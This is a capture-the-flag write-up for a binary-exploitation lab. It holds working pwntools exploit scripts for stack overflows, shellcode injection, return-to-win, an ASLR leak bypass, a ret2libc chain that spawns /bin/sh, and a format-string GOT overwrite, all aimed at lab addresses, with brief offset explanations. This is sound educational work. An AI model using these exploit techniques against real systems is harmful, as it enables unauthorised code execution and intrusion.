# TryPwnMe One

### TryOverflowMe 1
I developed the following exploit for this:<br />

    import socket
    
    ip = "10.10.7.174"
    
    port = 9003
    
    payload = "A"*45
    
    buffer = payload
    
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    
    try:
            s.connect((ip,port))
            response = s.recv(1024)
            print(response.decode())
    
            print("Sending payload...")
            s.send(bytes(buffer + "\r\n", "latin-1"))
    
            response = s.recv(4096)
            print("Response:\n", response.decode('latin-1'))
    
            print("Done!")
    except:
            print("Could not connect.")
![image](https://github.com/user-attachments/assets/d1cf6db5-ce6f-42cd-bb12-9ff6fe505327)<br />
But why 45 A's? If I open the binary on IDA, I can see that the buffer variable and the "admin" variable are 44 bytes apart:<br />
![image](https://github.com/user-attachments/assets/c886227a-d9f2-43e5-9eac-17de88f9ad3c)<br />
The buffer is at -30h, which is 48 bytes in decimal, and the admin variable is at -4h, which is 4 bytes in decimal. Their difference is 44, so I need to write at least 45 bytes to influence the admin variable.

### TryOverflowMe 2
I developed this exploit code for this task:

      import socket
      
      ip = "10.10.56.44"
      
      port = 9004
      
      payload = "A"*76
      
      admin = "\x59\x59\x59\x59"
      
      buffer = payload + admin
      
      s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
      
      try:
              s.connect((ip,port))
              response = s.recv(1024)
              print(response.decode())
      
              print("Sending payload...")
              s.send(bytes(buffer + "\r\n", "latin-1"))
      
              response = s.recv(4096)
              print("Response:\n", response.decode('latin-1'))
      
              print("Done!")
      except:
              print("Could not connect.")
![image](https://github.com/user-attachments/assets/761f96a0-42ed-4b41-bdc8-d0f45e4b4a1a)<br />
The offset to reach the admin variable is 76, but why?<br />
![image](https://github.com/user-attachments/assets/973df8aa-ce49-4328-82e7-2db006752881)<br />
The buffer is located at ebp + 50h, which is 80 in decimal. Then there are two integers (check and guess), and then there's the admin variable. So to overflow the admin variable I have to put 80 - 4 - 4 bytes + 0x59595959.

### TryExecMe
I used the following python code, this time I used pwntools (shellcraft) to create a shellcode:

    from pwn import *
    
    context.arch = 'amd64'
    
    p = remote('10.10.80.153', 9005)
    
    shellcode = asm(shellcraft.sh())
    payload = shellcode
    
    p.sendline(payload)

    p.interactive()


![image](https://github.com/user-attachments/assets/224a1741-7399-4ffd-ac67-78b23d57f215)<br />


### TryRetMe
First I use this code to find the right offset to reach the RIP:

        from pwn import *
        
        io = process('./tryretme')
        print(io.recvregex(b':')) # read until we get the prompt
        
        io.recvline()
        io.sendline(cyclic(500))
        io.wait()
        core = io.corefile
        stack = core.rsp
        info("rsp = %#x", stack)
        pattern = core.read(stack, 4)
        rip_offset = cyclic_find(pattern)
        info("rip offset is %d", rip_offset)

![image](https://github.com/user-attachments/assets/c31a0c06-5204-4b3b-a5b8-11db575070df)<br />
Now that I know the offset I can overflow the RIP with the address of the `win` function, which is `0x00000000004011dd` (just run "info functions" on gdb to get this address). I developed this code:

    from pwn import *
    
    context.arch = "amd64"
    ip = "10.10.127.82"
    port = 9006
    
    p = remote(ip,port)
    
    offset = b"A"*264
    win = p64(0x4011dd)
    ret_gadget = p64(0x401259)
    payload = offset + ret_gadget + win
    
    p.sendline(payload)
    
    p.interactive()
The reason why I had to add a `ret_gadget` to my payload is the **stack alignment**. You can understand more on the stack alignment [here](https://ir0nstone.gitbook.io/notes/binexp/stack/return-oriented-programming/stack-alignment).<br />
![image](https://github.com/user-attachments/assets/47a0ede6-db48-46cc-93a6-d19bfb4b57a1)<br />


### Random Memories
This time ASLR and PIE is active, so I can't predict the address of the win function. How ever the program leaks the address of "vuln". After finding the offset, I saw in a debugger that the distance between vuln and win was 0x109. I also needed a ret gadget so I did the same operation. The final code is the following:

    from pwn import *
    
    context.arch = 'amd64'
    ip = "10.10.115.215"
    port = 9007
    
    p = remote(ip,port)
    
    p.recvuntil(b'I can give you a secret ')
    
    leaked_vuln = int(p.recvline().strip(), 16)
    log.info(f"Leaked vuln address: {hex(leaked_vuln)}")
    
    offset_vuln_win = 0x109
  
    offset_vuln_ret = 0x87 
    
    win_addr = leaked_vuln - offset_vuln_win
    log.info(f"Computed address of win: {hex(win_addr)}")
    
    ret_gadget = leaked_vuln + offset_vuln_ret
    log.info(f"Computed address of ret gadget: {hex(ret_gadget)}")
    
    payload = b'A' * 264  # offset
    payload += p64(ret_gadget)
    payload += p64(win_addr)
    
    p.sendline(payload)
    
    p.interactive()

![image](https://github.com/user-attachments/assets/aa9efb44-ea5d-4534-a255-f69c9d70a282)

### The Librarian
This is a ret2libc attack: 

    from pwn import *
    
    p = remote('10.10.88.29', 9008)
    
    p.clean()
    
    binary = ELF('./thelibrarian')
    libc = ELF('./libc.so.6')
    
    puts_plt = binary.plt['puts']
    puts_got = binary.got['puts']
    main_addr = binary.symbols['main']
    
    rop = ROP(binary)
    pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0] 
    ret_gadget = rop.find_gadget(['ret'])[0]
    
    offset = 264
    
    payload = b'A' * offset
    payload += p64(pop_rdi)
    payload += p64(puts_got)
    payload += p64(puts_plt)
    payload += p64(main_addr)
    
    p.sendline(payload)
    p.recvuntil(b"let's go!\n\n")
    
    puts_leak = u64(p.recvline().strip().ljust(8, b'\x00'))
    puts_offset = libc.symbols['puts']
    libc_base = puts_leak - puts_offset
    system_addr = libc_base + libc.symbols['system']
    exit_addr = libc_base + libc.symbols['exit']
    bin_sh_addr = libc_base + next(libc.search(b'/bin/sh'))
    
    p.clean()
    
    payload = b'A' * offset
    payload += p64(pop_rdi)
    payload += p64(bin_sh_addr)
    payload += p64(ret_gadget)  
    payload += p64(system_addr)
    payload += p64(exit_addr) 
    
    p.sendline(payload)
    p.interactive()

### Not Specified
Format string:

        from pwn import *
        
        p = remote('10.10.226.149',9009)
        
        elf = context.binary = ELF('./notspecified')
        
        p.clean()
        
        payload = fmtstr_payload(6, {elf.got['puts'] : elf.sym['win']})
        p.sendline(payload)
        
        p.clean()
        p.interactive()
